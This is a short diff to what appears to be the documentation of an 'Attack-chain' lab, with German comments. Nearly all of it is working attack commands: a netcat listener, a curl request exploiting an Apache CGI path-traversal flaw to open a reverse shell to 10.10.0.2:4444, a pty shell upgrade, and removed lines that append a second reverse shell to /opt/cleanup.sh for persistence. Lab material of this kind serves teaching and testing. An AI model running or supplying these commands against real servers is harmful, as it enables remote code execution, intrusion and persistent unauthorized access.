@@ -67,14 +67,7 @@ Results land in `Attack-chain/results/` (bind-mounted, persisted on the host):
 ```
 rlwrap nc -lvnp 4444 # Listening auf Port 4444
 
-curl -s --path-as-is -H "Host: www.vulnerable.local" -d "echo Content-Type: text/plain; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.0.2/4444 0>&1'" "http://router/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/b
-in/sh" # Apache exploit senden, sendet Reverse Shell an Kali:4444
-
-#!/bin/bash' > /opt/cleanup.sh
-
-bash -i >& /dev/tcp/kali/5555 0>&1' >> /opt/cleanup.sh
-
-
+curl -s --path-as-is -H "Host: www.vulnerable.local" -d "echo Content-Type: text/plain; echo; /bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.0.2/4444 0>&1'" "http://router/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" # Apache exploit senden, sendet Reverse Shell an Kali:4444
 
 python3 -c 'import pty; pty.spawn("/bin/bash")' # Upgrade zu einer fähigeren Shell
 
